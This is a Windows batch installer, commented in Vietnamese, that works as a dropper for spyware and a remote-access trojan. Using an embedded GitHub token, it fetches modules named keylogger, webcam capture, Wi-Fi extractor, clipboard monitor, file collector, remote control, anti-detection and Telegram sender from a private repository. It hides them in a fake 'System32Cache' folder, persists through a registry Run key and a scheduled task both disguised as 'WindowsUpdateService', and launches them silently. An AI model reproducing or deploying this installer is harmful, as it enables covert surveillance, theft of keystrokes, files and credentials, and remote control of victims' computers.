@echo off
REM ========================================
REM INSTALLER TỰ ĐỘNG - REPO PRIVATE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải tất cả file từ GitHub Private Repo
REM 2. Cài đặt thư viện Python
REM 3. Ẩn thư mục và file
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

REM Chạy bình thường - hiển thị thông báo
chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
REM ========================================
REM Lấy token tại: https://github.com/settings/tokens
REM Cần quyền: repo (Full control of private repositories)
REM ========================================

REM Kiểm tra Python
python --version >nul 2>&1
if errorlevel 1 (
    py --version >nul 2>&1
    if errorlevel 1 (
        exit /b 1
    ) else (
        set "PYTHON_CMD=py"
    )
) else (
    set "PYTHON_CMD=python"
)

REM Tạo thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
if not exist "%INSTALL_DIR%\temp" mkdir "%INSTALL_DIR%\temp" >nul 2>&1

cd /d "%INSTALL_DIR%" >nul 2>&1

REM Tải tất cả file từ GitHub Private Repo
echo [1/5] Dang tai file tu GitHub...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o main_stealth.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o screen_recorder.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screen_recorder.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o keylogger.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/keylogger.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o telegram_sender.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/telegram_sender.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o file_manager.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_manager.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o stealth.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/stealth.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o hotkey_listener.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/hotkey_listener.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o internet_checker.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/internet_checker.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o performance_optimizer.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/performance_optimizer.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o anti_detection.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/anti_detection.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o updater.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/updater.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o data_manager.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/data_manager.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o clipboard_monitor.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/clipboard_monitor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o screenshot_capture.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screenshot_capture.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o file_collector.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_collector.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o process_monitor.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/process_monitor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o machine_id.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/machine_id.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o remote_control.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/remote_control.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o file_receiver.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_receiver.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o wifi_extractor.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/wifi_extractor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o webcam_capture.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/webcam_capture.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o usb_monitor.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/usb_monitor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o config.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o requirements.txt "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" >nul 2>&1

REM Cài đặt thư viện Python
echo [2/5] Dang cai dat thu vien Python...
%PYTHON_CMD% -m pip install --upgrade pip --quiet --disable-pip-version-check >nul 2>&1
%PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check >nul 2>&1

REM Ẩn thư mục và file
echo [3/5] Dang an thu muc va file...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
for %%f in ("%INSTALL_DIR%\*.py") do attrib +h "%%f" >nul 2>&1

REM Thêm vào Windows Startup (Registry)
echo [4/5] Dang them vao Windows Startup...
%PYTHON_CMD% -c "import winreg; import sys; key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, f'\"{sys.executable}\" \"%INSTALL_DIR%\\main_stealth.py\"'); winreg.CloseKey(key)" >nul 2>&1

REM Tạo task scheduler (backup)
schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\main_stealth.py\"" /sc onlogon /f /rl highest >nul 2>&1

REM Kiểm tra cài đặt thành công
if exist "%INSTALL_DIR%\main_stealth.py" (
    if exist "%INSTALL_DIR%\config.py" (
        echo [5/5] Dang khoi dong ung dung...
        echo.
        start "" /min pythonw "%INSTALL_DIR%\main_stealth.py" >nul 2>&1
        timeout /t 2 >nul 2>&1
        echo ========================================
        echo    CAI DAT THANH CONG!
        echo ========================================
        echo.
        echo Thu muc cai dat: %INSTALL_DIR%
        echo Ung dung da duoc them vao Windows Startup
        echo Ung dung da duoc khoi dong!
        echo.
        echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
        echo.
        echo Nhan phim bat ky de dong...
        pause
    ) else (
        echo [ERROR] Khong tim thay config.py
        pause
        exit /b 1
    )
) else (
    echo [ERROR] Khong tim thay main_stealth.py
    pause
    exit /b 1
)

exit /b 0
